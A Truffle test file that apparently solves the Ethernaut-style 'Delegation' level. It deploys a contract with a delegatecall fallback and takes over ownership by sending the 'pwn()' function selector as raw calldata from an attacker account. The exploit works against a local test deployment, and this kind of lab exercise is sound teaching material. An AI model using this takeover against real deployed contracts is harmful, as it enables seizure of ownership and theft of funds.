const Delegation = artifacts.require("Delegation");
const Delegate = artifacts.require("Delegate");

contract("Delegation", (accounts) => {
  let delegationInstance;
  let delegateInstance;
  const deployer = accounts[3]; // Account that deploys the contract and is the initial owner
  const attacker = accounts[0]; // Account that will try to take ownership

  before(async () => {
    // Deploy Delegate with the deployer as the initial owner
    delegateInstance = await Delegate.new(deployer, { from: deployer });

    // Deploy Delegation contract using the address of the deployed Delegate contract
    delegationInstance = await Delegation.new(delegateInstance.address, {
      from: deployer,
    });
  });

  it("should have the correct initial owner", async () => {
    // Check that the initial owner of the Delegation contract is the deployer (accounts[3])
    const initialOwner = await delegationInstance.owner();
    assert.equal(
      initialOwner,
      deployer,
      "Initial owner of the Delegation contract should be the deployer (accounts[3])"
    );
  });

  it("should allow the attacker to become the owner of the Delegation contract", async () => {
    // Compute the function selector for the "pwn()" function
    const functionSelector = web3.utils.keccak256("pwn()").slice(0, 10); // First 4 bytes of the keccak256 hash

    // Send a transaction to the Delegation contract with the function selector from the attacker
    await web3.eth.sendTransaction({
      from: attacker,
      to: delegationInstance.address,
      data: functionSelector,
    });

    // Check the updated owner of the Delegation contract
    const updatedOwner = await delegationInstance.owner();
    assert.equal(
      updatedOwner,
      attacker,
      "Owner should be updated to the attacker's address (accounts[0])"
    );
  });
});
